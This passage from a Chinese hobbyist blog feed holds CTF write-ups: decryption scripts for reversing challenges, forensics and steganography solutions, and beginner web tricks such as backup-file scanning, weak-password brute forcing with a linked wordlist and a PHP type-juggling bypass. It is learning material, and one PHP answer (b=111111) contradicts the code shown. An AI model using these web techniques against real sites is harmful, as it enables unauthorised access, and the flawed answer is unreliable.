class="string">&quot;726B607765584646154014411A400E461445160E174542410E1A4147450E4642131446131017451542165E&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_flag), <span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(encrypted_flag[i : i + <span class="number">2</span>], <span class="number">16</span>) ^ <span class="number">0x23</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)  <span class="comment"># QHCTF&#123;ee6c7b9c-e7f5-4fab-9bdf-ea07e034f6a5&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Rainbow-FINISHED"><a href="#Rainbow-FINISHED" class="headerlink" title="Rainbow | FINISHED"></a>Rainbow | FINISHED</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">encrypted_flag = <span class="string">&quot;0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_flag), <span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(encrypted_flag[i : i + <span class="number">2</span>], <span class="number">16</span>) ^ <span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)  <span class="comment"># QHCTF&#123;a8226103-5a9a-4fa7-abcf-dea438a7ce78&#125;</span></span><br></pre></td></tr></table></figure><h2 id="小明的​note-FINISHED"><a href="#小明的​note-FINISHED" class="headerlink" title="小明的​note | FINISHED"></a>小明的​note | FINISHED</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt_flag</span><span class="params">(<span class="type">char</span> *src, <span class="type">char</span> *trg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v6[] = &#123;<span class="number">0x42</span>, <span class="number">0x37</span>, <span class="number">0xA1</span>, <span class="number">0x7C</span>&#125;;</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">strlen</span>(src);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        trg[i] = v6[i % <span class="number">4</span>] ^ src[i];</span><br><span class="line">        trg[i] ^= i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    trg[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> Decrypted_flag[<span class="number">64</span>];</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>] = <span class="string">&quot;\x12\x7D\xE1\x2C\x01\x4A\xC4\x45\x78\x5E\xC9\x46\x78\x5D\x83\x0F\x37\x12\xD0\x45\x63\x42\xD5\x57\x76\x14\xDE\x06\x6E\x04\x8F\x3E\x50\x21\xE1\x3B\x53\x72\xB7\x6C\x5D\x79\xF7\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt_flag</span>(flag, Decrypted_flag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted flag: %s\n&quot;</span>, Decrypted_flag);    <span class="comment">// Decrypted flag: QHCTF&#123;b13cc67d-cd7b-4cc3-9df1-1b34cc4c186d&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Win-02-FINISHED"><a href="#Win-02-FINISHED" class="headerlink" title="Win\02 | FINISHED"></a>Win\02 | FINISHED</h2><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image022-20250126093903-sdi999f.jpg">​</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image024-20250126093903-1qdiw8l.jpg">​</p><p>QHCTF{fb484ad326c0f3a4970d1352bfbafef8}</p><h2 id="Win-04-FINISHED"><a href="#Win-04-FINISHED" class="headerlink" title="Win\04 | FINISHED"></a>Win\04 | FINISHED</h2><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image026-20250126093903-25pq5b5.jpg">​</p><p>QHCTF{c980ad20-f4e4-4e72-81a0-f227f6345f01}</p><h2 id="Win-05-FINISHED"><a href="#Win-05-FINISHED" class="headerlink" title="Win\05 | FINISHED"></a>Win\05 | FINISHED</h2><p>取证大师找到Todesk连接记录</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image028-20250126093903-59j3usj.jpg">​</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image030-20250126093903-g51hy7c.jpg">​</p><p>QHCTF{dca8df29e49e246c614100321e3b932e}</p><h2 id="干扰项-FINISHED"><a href="#干扰项-FINISHED" class="headerlink" title="干扰项 | FINISHED"></a>干扰项 | FINISHED</h2><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image032-20250126093903-j7x6co2.jpg">​</p><p><a href="https://pyinstxtractor-web.netlify.app/">https://pyinstxtractor-web.netlify.app/</a></p><p>解包exe</p><p><a href="https://tool.lu/pyc/index.html">https://tool.lu/pyc/index.html</a></p><p>恢复pyc，得到汇编</p><p>再恢复python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([data[i] ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    encrypted_data = cipher.encrypt(pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">aes_key, message</span>):</span><br><span class="line">    <span class="comment"># AES加密</span></span><br><span class="line">    aes_encrypted = aes_encrypt(aes_key, message)</span><br><span class="line">    <span class="comment"># Base64编码</span></span><br><span class="line">    base64_encoded = base64.b64encode(aes_encrypted)</span><br><span class="line">    <span class="comment"># XOR加密</span></span><br><span class="line">    xor_key = <span class="string">b&#x27;qihangcup&#x27;</span></span><br><span class="line">    xor_encrypted = xor_encrypt(base64_encoded, xor_key)</span><br><span class="line">    <span class="comment"># Base64再次编码</span></span><br><span class="line">    final_encrypted = base64.b64encode(xor_encrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_encrypted</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    aes_key = <span class="string">b&#x27;acf8bafa15f8cb03&#x27;</span></span><br><span class="line">    message = <span class="string">&#x27;QHCTF&#123;xxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    encrypted_message = encrypt_message(aes_key, message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;加密结果:&#x27;</span>, encrypted_message)</span><br></pre></td></tr></table></figure><p>写个解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([data[i] ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">aes_key, encrypted_message</span>):</span><br><span class="line">    <span class="comment"># Base64解码</span></span><br><span class="line">    xor_encrypted = base64.b64decode(encrypted_message)</span><br><span class="line">    <span class="comment"># XOR解密</span></span><br><span class="line">    xor_key = <span class="string">b&#x27;qihangcup&#x27;</span></span><br><span class="line">    base64_encoded = xor_decrypt(xor_encrypted, xor_key)</span><br><span class="line">    <span class="comment"># Base64解码</span></span><br><span class="line">    aes_encrypted = base64.b64decode(base64_encoded)</span><br><span class="line">    <span class="comment"># AES解密</span></span><br><span class="line">    decrypted_message = aes_decrypt(aes_key, aes_encrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    aes_key = <span class="string">b&#x27;acf8bafa15f8cb03&#x27;</span></span><br><span class="line">    encrypted_message = <span class="string">&#x27;HgIlNCQUF0MZRA0FMhwODBsTNjM4OQ8RMA81SCImFhQeVkQdCUJfMBs0Mx0fGVowIyoTJ0cdHCwKVwxIOQQCRA==&#x27;</span></span><br><span class="line">    </span><br><span class="line">    decrypted_message = decrypt_message(aes_key, encrypted_message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解密结果:&#x27;</span>, decrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># QHCTF&#123;8b0c14a8-5823-46fd-a547-0dcdc404a7ed&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 隼目CTF wp</title>
      <link href="/2024/12/17/%E9%9A%BC%E7%9B%AECTF-wp/"/>
      <url>/2024/12/17/%E9%9A%BC%E7%9B%AECTF-wp/</url>
      
        <content type="html"><![CDATA[<p>这次隼目CTF是跟sean组队，基本都是靠他撑着</p><p>我一个web蒟蒻就是一划水的，web不出意外的又爆零，misc倒是看了几道题（笑）</p><h1 id="sign-in"><a href="#sign-in" class="headerlink" title="sign in"></a>sign in</h1><p>前几步还挺简单，一开始提示凯撒加密，很容易在偏移量为1的时候解码出正常数据</p><p><img src="/img/%E9%9A%BC%E7%9B%AE/%E9%9A%BC%E7%9B%AE1.PNG"></p><p>直接base64转图片即可，然后把图片下下来开始各种…（stegsolve，rgb爆破等等）均无果</p><p>最后死也没想出来是什么隐写…出题人上hint说是《非本地隐写》，BYD非本地隐写是在线隐写是吧</p><p><img src="/img/%E9%9A%BC%E7%9B%AE/%E9%9A%BC%E7%9B%AE3.PNG"></p><p>当时刚刚接触CTF的时候，一开始啥也不会，在网上随便搜就搜到的是这种隐写<br>后来学了其他“正统”方法，这种早被我扔脑后了（悲）</p><h1 id="夜观天象"><a href="#夜观天象" class="headerlink" title="夜观天象"></a>夜观天象</h1><p>给了一个html文件，让我们在里面找东西<br>而网页打开就是普通的歌词而已，也没别的<br>但是发现源码里面有RGB，一开始还是考虑什么RGB隐写啥的<br>后来发现全部抄下来16进制转换后就能得到具体信息（gift is p@sswd）</p><p>至于这个wav，常规隐写思路是看audacity<br>但是这音频就是放了首歌，看破头也没在audacity里面看出来什么东西<br>于是乎搜索“带有key的wav隐写”后，找到了silenteye和deepsound两个工具</p><p>分别试了一下，deepsound没东西，silenteye成功拿到flag.txt</p><p>这里有两个注意点，第一我们要输入的密码是p@sswd而不是gift<br>第二就是前后都要输一遍才能正确解密，（如下图），我一开始捣鼓了好久</p><p><img src="/img/%E9%9A%BC%E7%9B%AE/%E9%9A%BC%E7%9B%AE4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我夜观天象，算出你将会得到flag</span><br><span class="line"></span><br><span class="line">天象=<span class="string">&#x27;角木蛟 觜火猴 箕水豹 毕月乌 氐土貉 毕月乌 轸水蚓 女土蝠 尾火虎 昴日鸡 壁水貐 箕水豹 尾火虎 奎木狼 心月狐 张月鹿 尾火虎 井木犴 昴日鸡 柳土獐 角木蛟 女土蝠 室火猪 觜火猴 氐土貉 奎木狼 牛金牛 箕水豹 亢金龙 胃土雉 房日兔 翼火蛇 尾火虎 轸水蚓 箕水豹 尾火虎 尾火虎 壁水貐 牛金牛 亢金龙 氐土貉 箕水豹 翼火蛇 翼火蛇 亢金龙 女土蝠 星日马 角木蛟 壁水貐 井木犴 角木蛟 牛金牛 箕水豹 柳土獐 室火猪 张月鹿 心月狐 星日马 角木蛟 虚日鼠 亢金龙 参水猿 箕水豹 箕水豹 尾火虎 翼火蛇 斗木獬 参水猿 心月狐 尾火虎 张月鹿 张月鹿 虚日鼠 星日马 斗木獬 室火猪 氐土貉 鬼金羊 角木蛟 娄金狗 斗木獬 井木犴 壁水貐 斗木獬 氐土貉 星日马 轸水蚓 氐土貉&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>搜索一下，网上并没有这种编码<br>再看看，发现解密过程可以参考HSCSEC CTF2023的题，直接抄网上脚本就可以了<br>但是有点不太一样喵，四进制没凑出来（实际上是可以的，参考yolo师傅的wp）<br>我尝试了二进制，如图进行编码对应</p><p><img src="/img/%E9%9A%BC%E7%9B%AE/%E9%9A%BC%E7%9B%AE5.png"></p><p>然后网上找个脚本改一下，运行出结果直接扔到赛博厨子就出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">东方青龙=<span class="string">&#x27;角木蛟、亢金龙、氐土貉、房日兔、心月狐、尾火虎、箕水豹&#x27;</span>.split(<span class="string">&#x27;、&#x27;</span>)</span><br><span class="line">北方玄武=<span class="string">&#x27;斗木獬、牛金牛、女土蝠、虚日鼠、危月燕、室火猪、壁水貐&#x27;</span>.split(<span class="string">&#x27;、&#x27;</span>)</span><br><span class="line">西方白虎=<span class="string">&#x27;奎木狼、娄金狗、胃土雉、昴日鸡、毕月乌、觜火猴、参水猿&#x27;</span>.split(<span class="string">&#x27;、&#x27;</span>)</span><br><span class="line">南方朱雀=<span class="string">&#x27;井木犴、鬼金羊、柳土獐、星日马、张月鹿、翼火蛇、轸水蚓&#x27;</span>.split(<span class="string">&#x27;、&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">角木蛟 觜火猴 箕水豹 毕月乌 氐土貉 毕月乌 轸水蚓 女土蝠 尾火虎 昴日鸡 壁水貐 箕水豹 尾火虎 奎木狼 心月狐 张月鹿 尾火虎 井木犴 昴日鸡 柳土獐 角木蛟 女土蝠 室火猪 觜火猴 氐土貉 奎木狼 牛金牛 箕水豹 亢金龙 胃土雉 房日兔 翼火蛇 尾火虎 轸水蚓 箕水豹 尾火虎 尾火虎 壁水貐 牛金牛 亢金龙 氐土貉 箕水豹 翼火蛇 翼火蛇 亢金龙 女土蝠 星日马 角木蛟 壁水貐 井木犴 角木蛟 牛金牛 箕水豹 柳土獐 室火猪 张月鹿 心月狐 星日马 角木蛟 虚日鼠 亢金龙 参水猿 箕水豹 箕水豹 尾火虎 翼火蛇 斗木獬 参水猿 心月狐 尾火虎 张月鹿 张月鹿 虚日鼠 星日马 斗木獬 室火猪 氐土貉 鬼金羊 角木蛟 娄金狗 斗木獬 井木犴 壁水貐 斗木獬 氐土貉 星日马 轸水蚓 氐土貉</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.split()</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    number=[i[a*<span class="number">3</span>:a*<span class="number">3</span>+<span class="number">3</span>] <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> number:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> 东方青龙:</span><br><span class="line">            flag+=<span class="string">&#x27;01&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> 北方玄武:</span><br><span class="line">            flag+=<span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> 西方白虎:</span><br><span class="line">            flag+=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> 南方朱雀:</span><br><span class="line">            flag+=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">    flag+=<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E9%9A%BC%E7%9B%AE/%E9%9A%BC%E7%9B%AE6.png"></p><h1 id="base1024"><a href="#base1024" class="headerlink" title="base1024"></a>base1024</h1><p>这题网上搜一下就有对应资料，解码就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    b_已解字节内容 = h_千字文解码(</span><br><span class="line">        <span class="string">&quot;利师迩鉴石碣遥逍汉玄珍覆穑碣云罗侈平同此竹岱饭乎见槐洛五伦璧策缘芸武秦伤阮空创欲雁刻分超任策迩释机于焉笃僚施迩姿植沙疫书曲亲零零零&quot;</span></span><br><span class="line">    )  <span class="comment"># b_千字文编码)</span></span><br><span class="line">    b_文本内容 = b_已解字节内容.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码好的:&quot;</span> + b_文本内容)</span><br><span class="line">    <span class="comment"># 脑洞竞技 代码逆向 漏洞挖掘 团队协作 密码破译 云端对决</span></span><br><span class="line">    <span class="comment"># flag&#123;脑洞竞技 代码逆向 漏洞挖掘 团队协作 密码破译 云端对决&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，欢迎大家去seandictionary那里看crypto的wp</p><p>也欢迎大家去yolo和st4rr师傅那里看他们的wp，有更多思路</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界引导模式 web 前10题wp</title>
      <link href="/2024/12/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%89%8D10%E9%A2%98wp%EF%BC%88%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F%EF%BC%89/"/>
      <url>/2024/12/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%89%8D10%E9%A2%98wp%EF%BC%88%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>让我们从最基础的开始看起吧qaq</p><p>因为都是较为简单的题，网上有大把详细wp，本文侧重于记录新学到的东西</p><p>此博客为本蒟蒻做的第一篇针对web的wp，如有问题还请多多指教</p><h1 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h1><p>法1：禁用右键，关我Ctrl+U什么事））</p><p>法2：在网站前加上“view-source:”即可。</p><p>法3：直接在edge右上角打开开发人员工具，源代码中即可看到flag。</p><h1 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h1><p>根据题目，了解robots协议：</p><p>“robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。”</p><p>直接在网站后面加&#x2F;robots.txt即可看到flag。</p><p>这里还get了一个新工具：dirsearch，马上下载下来试试，发现很方便。</p><p><img src="/img/GFSJ10/GFSJ1.png"></p><h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><p>又学到了：常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history</p><p>活学活用，用上一题学到的工具扫</p><p><img src="/img/GFSJ10/GFSJ2.png"></p><p>正好有一个符合.bak文件的，进去之后下载附件，打开得到flag。</p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>没啥好说的，都在开发人员工具里面：</p><p>1.浏览器按下F12键打开开发者工具，刷新后，在存储一栏，可看到名为look-here的cookie的值为cookie.php</p><p>2.访问 题目环境位置网址&#x2F;cookie.php ，提示查看http响应包，在网络一栏，可看到访问cookie.php的数据包</p><p>3.点击查看数据包，在消息头内可发现flag</p><h1 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h1><p>按了按钮就能得到flag，但是按钮按不了了</p><p>属实是考了点前端知识，审查元素，发现存在disabled&#x3D;””字段，删掉后按钮就可以按了</p><h1 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h1><p>我用的是burpsuite，需要修改请求包，<strong>在这里注重一下get请求和post请求的区别</strong>：</p><p>POST请求比GET请求多了一行：</p><p>Content-Type: application&#x2F;x-www-form-urlencoded（务必加上）</p><p><a href="https://blog.csdn.net/weixin_51735061/article/details/123647266" title="非常好的博客，非常到位的总结">CTF——HTTP发送头Headers整理</a></p><p>如果要把两种请求混合起来发，则如下图所示</p><p><img src="/img/GFSJ10/GFSJ3.png"></p><h1 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h1><p>弱口令爆破，很熟练的操作</p><p>把密码字典的网址放在这里方便调用<a href="https://weakpass.com/">点我下载密码字典</a> </p><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>题目给出代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>“php中有两种比较符号，&#x3D;&#x3D;&#x3D; 会同时比较字符串的值和类型，&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较。”</p><p>又学到新东西了，这是php语言，<strong>看来还是要系统的学习一下</strong></p><p>同时满足 $a&#x3D;&#x3D;0 和 $a 时，显示flag1，php中的弱类型比较会使输入a&#x3D;任意字符时，得到flag1；is_numeric() 函数会判断，如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ &#x3D;&#x3D; 1234)为真，所以当输入a&#x3D;任意字符&amp;b&#x3D;111111，可得到flag2。</p><h1 id="Training-www-Robots"><a href="#Training-www-Robots" class="headerlink" 